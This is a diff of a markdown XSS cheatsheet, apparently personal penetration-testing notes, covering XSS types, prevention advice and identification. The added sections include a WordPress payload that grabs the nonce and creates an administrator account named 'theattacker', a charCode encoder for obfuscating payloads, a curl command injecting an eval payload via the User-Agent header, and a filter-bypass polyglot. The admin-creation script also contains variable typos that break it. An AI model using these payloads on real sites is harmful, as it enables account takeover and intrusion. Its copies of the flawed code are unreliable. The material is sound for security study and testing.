@@ -1,5 +1,7 @@
 # XSS Cheatsheet
 
+## Introduction
+
 [Portswigger](https://portswigger.net/web-security/cross-site-scripting) states that: *"Cross-site scripting (also known as XSS) is a web security vulnerability that allows an attacker to compromise the interactions that users have with a vulnerable application. It allows an attacker to circumvent the same origin policy, which is designed to segregate different websites from each other. Cross-site scripting vulnerabilities normally allow an attacker to masquerade as a victim user, to carry out any actions that the user is able to perform, and to access any of the user's data. If the victim user has privileged access within the application, then the attacker might be able to gain full control over all of the application's functionality and data."*
 
 XSS manipulates a vulnerable web site to return malicious JavaScript to victims. The JavaScript is either executed client-side in the browser or server-side in a database or cached by the server. All XSS payloads are executed in the context of the user that visited the page with the XSS payload. Unsanitized data can allow attacker to inject client side scripts into web pages and execute malicious code.
@@ -8,16 +10,30 @@ For executing malicious JavaScript client-side the attacker is targeting the bro
 
 For executing server-side malicious JavaScript is *stored* as data passed via a input field into a database of a web site or into the server's cached memory.  
 
+#### Use Cases of XSS
 
-[Types of XSS](https://owasp.org/www-community/Types_of_Cross-Site_Scripting) 
+[Portswigger XSS](https://portswigger.net/web-security/cross-site-scripting):
+- Impersonate or masquerade as the victim user.
+- Carry out any action that the user is able to perform.
+- Read any data that the user is able to access.
+- Capture the user's login credentials.
+- Perform virtual defacement of the web site.
+- Inject trojan functionality into the web site.
+
+## [Types of XSS](https://owasp.org/www-community/Types_of_Cross-Site_Scripting) 
+
 - [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting#dom-based-cross-site-scripting)
 	- Description:
 		 - A vulnerability existing in Client Side code rather than Server-Side code leads to the victims Browser executing malicious JavaScript
-		- Is a variant of either [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting#reflected-cross-site-scripting) or [Stored XSS](https://portswigger.net/web-security/cross-site-scripting#stored-cross-site-scripting) occurs client Side in a browser's generated  internal Document Object Model (DOM), which creates a DOM tree to then render the page - executing malicious JavaScript in the process of rendering the page
+		- Is a variant of either [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting#reflected-cross-site-scripting) or [Stored XSS](https://portswigger.net/web-security/cross-site-scripting#stored-cross-site-scripting) that occurs client-side in a browser's generated internal Document Object Model (DOM), which creates a DOM tree to then render the page - executing malicious JavaScript in the process of rendering the page.
 	- Affects:
 	- Identifying Vulnerabilities:
+		- Is there access to the DOM?
+		- Can data be written back to the DOM?
 	- Subclasses
-	- Notes
+	- Notes:
+		- Sometimes called:
+			- DOM XSS
 - [Stored XSS](https://portswigger.net/web-security/cross-site-scripting#stored-cross-site-scripting) 
 	- Description:
 		- Payload is stored in website's database or cached by server 
@@ -27,12 +43,15 @@ For executing server-side malicious JavaScript is *stored* as data passed via a 
 		- Victims that visit the affect page
 	- Identifying Vulnerabilities:
 		- Unsanitized / Raw page functionality that stores data into a Database or Server's cache
-			- For Example:
-				- Comments sections allowing HTML, JavaScript
+			- For Example - anything allowing HTML, JavaScript:
+				- Comments sections on blogs posts
+				- User nicknames
+				- Contact Details
+				- Customer Orders
 	- Subclasses:
-		- Blind
-	- Notes
-		- Sometimes called...:
+		- *Blind cross-site scripting (XSS) is a type of [stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) in which the data exit point is not accessible to the attacker, for example due to a lack of privileges.* - [Portswigger](https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss/testing-for-blind-xss)
+	- Notes:
+		- Sometimes called:
 			- Persistent XSS
 			- Second-order XSS
 -  [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting#reflected-cross-site-scripting)
@@ -47,7 +66,7 @@ For executing server-side malicious JavaScript is *stored* as data passed via a 
 		- User that is force to request the link via [[Cross-Site-Request-Forgery]] or is a victim of [[Social-Engineering]] to [[click-the-link]]
 	- Identifying Vulnerabilities: 
 		- [XSS Hunter Express](https://github.com/mandatoryprogrammer/xsshunter-express)
-		- 
+		- wherever *an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way* - [Portswigger](https://portswigger.net/web-security/cross-site-scripting)
 	- Subclasses
 	- Notes
 - [Self-XSS](https://en.wikipedia.org/wiki/Self-XSS) 
@@ -55,24 +74,40 @@ For executing server-side malicious JavaScript is *stored* as data passed via a 
 		- When a user is victim of [[Social-Engineering]] that SE attack deceives the victim to execute malicious JavaScript directly into the user's own browser.
 	- Affects:
 		- Users browser
-		- Users
+		- SE-able Users
 	- Identifying Vulnerabilities:
 		- Non-technical users 
 		- Individual that are not fluent or understand JavaScript or the Browser Development tools embedded in the browser they use.
 	- Subclasses
 	- Notes
-		 
-
-Mutated XSS | Injection that rewritten and modified by browser while parsing the markup. | Type related. 
+- Mutation XSS
+	- Description:
+		- Injection that is rewritten and modified by browser while parsing the markup
+	- Affects:
+		- XSS-Type Related
+	- Identifying Vulnerabilities:
+	- Subclasses
+	- Notes
+		- [Mutation XSS - medium Article contains unfindable OWASP reference](https://medium.com/@anmolbagul20/mutation-xss-a6c048ad65fd)
+	- Articles:
+		- [Michał Bentkowski - Mutation XSS via namespace confusion – DOMPurify < 2.0.17 bypass](https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/)
+		- [Gareth Heyes - # Bypassing DOMPurify again with mutation XSS](https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss)
 
 ## Prevention and Mitigation
 
-A defence in depth approach should be applied as data should be sanitised in every location to where the data is passed.
+A defence in depth approach should be applied as data should be sanitised in every location to where the data is passed. Consider reviewing the most up-to-date versions of:
+- [XSS Prevention Cheatsheet from OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
+- [DOM XSS Prevention Cheatsheet from OWASP](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
 
-[XSS Prevention Cheatsheet from OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
-[DOM XSS Prevention Cheatsheet from OWASP ](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
+[OWASP - The Ultimate Cheatsheet for XSS Protection for Developers](https://owasp.org/www-pdf-archive//Xenotix_XSS_Protection_CheatSheet_For_Developers.pdf)
 
-[Mozilla Cookie security relating to XSS](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Secure_and_HttpOnly_cookie):
+[Portswigger](https://portswigger.net/web-security/cross-site-scripting) prevents:
+- **Filter input on arrival.** At the point where user input is received, filter as strictly as possible based on what is expected or valid input.
+- **Encode data on output.** At the point where user-controllable data is output in HTTP responses, encode the output to prevent it from being interpreted as active content. Depending on the output context, this might require applying combinations of HTML, URL, JavaScript, and CSS encoding.
+- **Use appropriate response headers.** To prevent XSS in HTTP responses that aren't intended to contain any HTML or JavaScript, you can use the `Content-Type` and `X-Content-Type-Options` headers to ensure that browsers interpret the responses in the way you intend.
+- **Content Security Policy.** As a last line of defence, you can use [Content Security Policy](https://portswigger.net/web-security/cross-site-scripting/content-security-policy) (CSP) to reduce the severity of any XSS vulnerabilities that still occur.
+
+Regarding Cookies - [Mozilla Cookie security relating to XSS](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Secure_and_HttpOnly_cookie):
 - *Use the `HttpOnly` attribute to prevent access to cookie values via JavaScript.*
 	- *Cookies created via JavaScript can't include the `HttpOnly` flag*
 - Cookie Lifetimes 
@@ -81,11 +116,17 @@ A defence in depth approach should be applied as data should be sanitised in eve
 
 ## Identifying XSS
 
-If the application does not filtering these characters by removing or encoding them, it may be vulnerable to XSS.
-```javascript
-< > ' " { } ;
+If the application does not filtering or removing these characters by removing or encoding (URL and HTML), it may be vulnerable to XSS.
+```js
+< >   // HTML elements
+{}    // JavaScript function declarations
+'' "" // JavaScript string declarations
+;     // JavaScript statement termination
 ```
 
+- Review the JavaScript Code 
+- Does the Browser has a update-to-date [Content Security Policy](https://portswigger.net/web-security/cross-site-scripting/content-security-policy) or can it be circumvented? 
+- Can you capture data like [[Cross-Site-Request-Forgery]] tokens with [Dangling Markup Injection](https://portswigger.net/web-security/cross-site-scripting/dangling-markup)
 ## Useful Tricks
 
 Listener at the ready you can check if you get a connection back:
@@ -108,7 +149,67 @@ Bypass payload size restrictions by [linking to an external Javascript file](htt
 
 With iframes see either `src` indicative of a URL or content with `data` or `srcdoc` in [Hacktrick Iframes in XSS, CSP, and SOP](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/iframes-in-xss-and-csp) 
 
+Use Minification and encoding with JavaScript in Browser developer console to encode minifed Javascript payloads
+```js
+// use https://jscompress.com or similar to minify JavaScript
+function encode_to_javascript(string) {
+            var input = string
+            var output = '';
+            for(pos = 0; pos < input.length; pos++) {
+                output += input.charCodeAt(pos);
+                if(pos != (input.length - 1)) {
+                    output += ",";
+                }
+            }
+            return output;
+        }
+        
+let encoded = encode_to_javascript('insert_minified_javascript')
+console.log(encoded)
+```
 
+#### Privilege Escalation with New Admin User creation
+
+[Shift8 Article - Create an Admin user](https://shift8web.ca/2018/01/craft-xss-payload-create-admin-user-in-wordpress-user/) 
+```js
+// Get the Wordpress Nounce in Javascript
+var ajaxRequest = new XMLHttpRequest();
+var requestURL = "/wp-admin/user-new.php";
+var wp_nonceRegex = /ser" value="([^"]*?)"/g;
+wajaxRequest.open("GET", requestURL, false);
+ajaxRequest.send();
+var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
+var nonce = nonceMatch[1];
+// Then create a new admin user with JavaScript
+var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=theattacker&email=theattacker@whatever.com&pass1=attackpass&pass2=attackpass&role=administrator";
+ajaxRequest = new XMLHttpRequest();
+ajaxRequest.open("POST", requestURL, true);
+ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+ajaxRequest.send(params);
+```
+Deliver Payload - article recommends [javascript-minifier.com](https://javascript-minifier.com/) - Use Minification and encoding with JavaScript in Browser developer console to encode minifed Javascript payloads
+```js
+// use https://jscompress.com or similar to minify JavaScript
+function encode_to_javascript(string) {
+            var input = string
+            var output = '';
+            for(pos = 0; pos < input.length; pos++) {
+                output += input.charCodeAt(pos);
+                if(pos != (input.length - 1)) {
+                    output += ",";
+                }
+            }
+            return output;
+        }
+        
+let encoded = encode_to_javascript('insert_minified_javascript')
+console.log(encoded)
+```
+
+Use `curl` to send via `burpsuite` proxy for modification if required to a the vulnerable web site
+```bash
+curl -i http://vulnwordpress.com --user-agent "<script>eval(String.fromCharCode($encodedJS))</script>" --proxy 127.0.0.1:8080
+```
 ## XSS Polyglots
 ```javascript
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e
@@ -118,14 +219,24 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stY
 
 This cheat sheet lists a series of XSS attacks that can be used to bypass certain XSS defensive filters. Please note that input filtering is an incomplete defence for XSS which these tests can be used to illustrate. [Sking7](https://sking7.github.io/articles/218647712.html)
 
+## Objectives?
+
+- Steal cookies or session information (like [[Session-Tokens]]) if session management configuration is insecure
+	- Important Cookie flags:
+		- `Secure` [flag](https://en.wikipedia.org/wiki/Secure_cookie) instructs the browser to only send the cookie over encrypted connections  
+		- `HttpOnly` [flag](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Secure_and_HttpOnly_cookies) instructs the browser to deny JavaScript access to the cookie - if it is not set we can use XSS to steal a cookie
+			- *Cookies created via JavaScript can't include the `HttpOnly` flag*
+- Privilege Escalation via using JavaScript to add another administrative account
+- Defacement
 ## References
-[Owasp](https://owasp.org/www-community/attacks/xss/)
+
+[OWASP](https://owasp.org/www-community/attacks/xss/)
 [XSS Prevention Cheatsheet from OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
 [DOM XSS Prevention Cheatsheet from OWASP ](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
 [XSS Wiki](https://en.wikipedia.org/wiki/Cross-site_scripting)
 [sking7](https://sking7.github.io/articles/218647712.html)
 [Bankrobber Ippsec Video](https://www.youtube.com/watch?v=zYmA9ECuCio)
-[Owasp Types of XSS](https://owasp.org/www-community/Types_of_Cross-Site_Scripting)
+[OWASP community - Types of XSS](https://owasp.org/www-community/Types_of_Cross-Site_Scripting)
 [Hacktrick Iframes in XSS, CSP, and SOP](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/iframes-in-xss-and-csp) 
 [Wikipedia Secure Cookie flag](https://en.wikipedia.org/wiki/Secure_cookie) 
 [Mozilla Secure and HttpOnly Cookie ](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Secure_and_HttpOnly_cookie)
@@ -133,3 +244,8 @@ This cheat sheet lists a series of XSS attacks that can be used to bypass certai
 [Portswigger Stored XSS](https://portswigger.net/web-security/cross-site-scripting#stored-cross-site-scripting)
 [Wikipedia Self-XSS](https://en.wikipedia.org/wiki/Self-XSS) 
 [Mozilla DOM](https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model/Introduction)
+[Michał Bentkowski -  Mutation XSS via namespace confusion – DOMPurify < 2.0.17 bypass](https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/)
+[Gareth Heyes - # Bypassing DOMPurify again with mutation XSS](https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss)
+[Portswigger Testing for Blind XSS](https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss/testing-for-blind-xss)
+[javascript-minifier.com](https://javascript-minifier.com/)
+[Shift8 Article - Create an Admin user in Wordpress](https://shift8web.ca/2018/01/craft-xss-payload-create-admin-user-in-wordpress-user/) 
